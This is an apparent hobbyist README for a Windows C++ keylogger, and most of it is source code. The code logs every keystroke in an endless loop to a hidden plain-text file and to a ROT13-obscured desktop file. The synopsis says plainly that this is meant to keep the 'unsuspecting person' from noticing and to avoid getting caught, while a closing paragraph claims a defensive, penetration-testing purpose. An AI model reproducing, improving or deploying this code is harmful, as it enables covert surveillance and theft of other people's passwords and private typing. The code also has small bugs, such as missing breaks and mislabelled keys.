Keylogger Encryption readme
Synopsis:
The program I have created is an Keylogger program. I created this prorgram to have a better understanding of how Keyloggers work and I wanted to expand my knowledge on how to create one and see if I can make a much better one after this. This is a program that creates two files: One file is plain text and it is hidden somewhere in the computers directory file. The second file is located on the desktop and it is encrypted via Caeser cipher to make sure that the unsuspecting person does not know what it is you are recording. This way you can obtain the infomration you want from the user and prevent getting caught by the said user.


Code Example:
This code example below creates is designed for encrypting the file. The string CipherEncryption fucntion takes in a string that the user types in anywhere in the computer. Then the string is shifted by 13 key in the Caeser cipher for loop to encrypt the message. From there the string is returned to a string function called RegularAndEncryptedRecordings(string typedkeys). In that function the encrypted string is stored inside one of the files that takes in all encrypted files. 
string CipherEncryption(char d, string typedkeys)
{
	int counter;
	
	// The Caeser cipher that encrypts the messages for OutScam
	
	for (counter = 0; counter < typedkeys.length(); counter++)
	{
		if (isalpha(typedkeys[counter]))
		{
			typedkeys[counter] = tolower(typedkeys[counter]);
			for (int i = 0; i < 13; i++)
			{
				if (typedkeys[counter] == 'z')
				{
					typedkeys[counter] = 'a';
				}
				else
				{
					typedkeys[counter]++;
				}
			}
		}
	}
	return typedkeys;
}

In this function I created this seperates the strings and places them into two seperate out put files. The file going to Hydra(Plain text file) is plain text. The string going to Scam(encrypted text file) the string calls the CipherEncryption function and places inside cipher text inside of it. The rest of the function details what happens if a user types in a uppercase letter, lower case letter, keys that uses the shift button and other keys on the keyboard. The program is also an infinite loop so that way it ends only when the user opens Task Manager and ends the program from there. 

string RegularAndEncryptedRecordings(string typedkeys)
{
	char d = ' ';
	stringstream ss;
	string keysToType = "";
	char stuff = ' ';
	cout << typedkeys << endl;
	// starts the for loop that needs to be implemented to create the virus
	// Starts the infinite loop in order to create the keylogger
	for (;;)
	{
		
		for (d = 8; d < 224; d += 1)
		{
			if (GetAsyncKeyState(d) == - 32767)
			{	
				// Creates the path for the indivduals to find the important file
				ofstream outHydra;
				ofstream outScam;
				/*outHydra.open("C:\\Users\\Zak\\Documents\\FilesOfImportance\\Hydra.txt", ios::app);
				outScam.open("C:\\Users\\Zak\\Desktop\\JunkFiles\\Scam.txt", ios::app);*/

				outHydra.open("C:\\Users\\Public\\FilesOfImportance\\Hydra.txt", ios::app);
				outScam.open("C:\\Users\\Desktop\\JunkFiles\\Scam.txt", ios::app);

				// If statement to record the infomration
				if ((d > 64) && (d < 91) && !(GetAsyncKeyState(0x10)))
				{
					d += 32;
					outHydra << d;
					typedkeys = d;
					outScam << CipherEncryption(d, typedkeys);
					outHydra.close();
					outScam.close();
					break;
				}
				else if ((d > 64) && (d < 91))
				{
					outHydra << d;
					typedkeys = d;
					outScam << CipherEncryption(d, typedkeys);
					outHydra.close();
					outHydra.close();
					break;
				}
				
				// Code that takes in all other things people will type
				else
				{
					switch (d)
					{
						case 48:
							if (GetAsyncKeyState(0x10))
							{
								outHydra << ")";
								outScam << ")";
							}
							else
							{
								outHydra << "0";
								outScam << "0";
							}
							break;
						case 49: 
							if (GetAsyncKeyState(0x10) )
							{ 
								outHydra << "!";
								outScam << "!";
							}
							else
							{
								outHydra << "1";
								outScam << "1";
							}
							break;
						case 50:
							if (GetAsyncKeyState(0x10))
							{
								outHydra << "@";
								outScam << "@";
							}
							else
							{
								outHydra << "2";
								outScam << "2";
							}
							break;
						case 51:
							if (GetAsyncKeyState(0x10))
							{
								outHydra << "#";
								outScam << "#";
							}
							else
							{
								outHydra << "3";
								outScam << "3";
							}
							break;
						case 52:
							if (GetAsyncKeyState(0x10))
							{
								outHydra << "$";
								outScam << "$";
							}
							else
							{
								outHydra << "4";
								outScam << "4";
							}
							break;
						case 53:
							if (GetAsyncKeyState(0x10))
							{
								outHydra << "%";
								outScam << "%";
							}
							else
							{
								outHydra << "5";
								outScam << "5";
							}
							break;
						case 54:
							if (GetAsyncKeyState(0x10))
							{
								outHydra << "^";
								outScam << "^";
							}
							else
							{
								outHydra << "6";
								outScam << "6";
							}
							break;
						case 55:
							if (GetAsyncKeyState(0x10))
							{
								outHydra << "&";
								outScam << "&";
							}
							else
							{
								outHydra << "7";
								outScam << "7";
							}
							break;
						case 56:
							if (GetAsyncKeyState(0x10))
							{
								outHydra << "*";
								outScam << "*";
							}
							else
							{
								outHydra << "8";
								outScam << "8";
							}
							break;
						case 57:
							if (GetAsyncKeyState(0x10))
							{
								outHydra << "(";
								outScam << "(";
							}
							else
							{
								outHydra << "9";
								outScam << "9";
							}
							break;
						case VK_SPACE:
							outHydra << " ";
							outScam << " ";
							break;
						case VK_RETURN:
							outHydra << "\n";
							outScam << "\n";
							break;
						case VK_TAB:
							outHydra << "	";
							outScam << " ";
						case VK_BACK:
							outHydra << "<BACKSPACE>";
							outScam << "<BACKSPACE>";
							break;
						case VK_ESCAPE:
							outHydra << "<ESC>";
							outScam << "<ESC>";
							break;
						case VK_DELETE:
							outHydra << "<DELETE>";
							outScam << "<DELETE>";
							break;
						case VK_F1:
							outHydra << "<F1>";
							outScam << "<F1>";
							break;
						case VK_F10:
							outHydra << "<F10>";
							outScam << "<F10>";
							break;
						case VK_F11:
							outHydra << "<F11>";
							outScam << "<F11>";
							break;
						case VK_F12:
							outHydra << "<F12>";
							outScam << "<F12>";
							break;
						case VK_F2:
							outHydra << "<F2>";
							outScam << "<12>";
							break;
						case VK_F3:
							outHydra << "<F3>";
							outScam << "<F3>";
							break;
						case VK_F4:
							outHydra << "<F4>";
							outScam << "<F4>";
							break;
						case VK_F5:
							outHydra << "<F5>";
							outScam << "<F5>";
						case VK_F6:
							outHydra << "<F6>";
							outScam << "<F6>";
							break;
						case VK_F7:
							outHydra << "<F7>";
							outScam << "<F7>";
							break;
						case VK_F8:
							outHydra << "<F8>";
							outScam << "<F8>";
							break;
						case VK_F9:
							outHydra << "<F9>";
							outScam << "<F9>";
							break;
						case VK_UP:
							outHydra << "<UP>";
							outScam << "<UP>";
							break;
						case VK_LEFT:
							outHydra << "<LEFT>";
							outScam << "<LEFT>";
							break;
						case VK_RIGHT:
							outHydra << "<RIGHT>";
							outScam << "<RIGHT>";
							break;
						case VK_DOWN:
							outHydra << "<DOWN>";
							outScam << "<DOWN>";
							break;

					}
				}
			}

			
		}
	}
}

Motivation:
The motivation for this project is to have white hat hackers, and software developers to gain ideas from the indie programmer community to help prevent virus from infecting computers. Also this program is for penetration testers and any software developers looking to create better defenses for computing systems.

Installation:
The program requires a windows 10 based enviroment in order to work. The reason being is that the SDK's do not work well outside of a windows 10 enviroment. So in order to avoid any problems using the software make sure it is running in a windows 10 enviroment. The program itself is not backwards compatable and it does not work on any other operating system but Windows 10. 

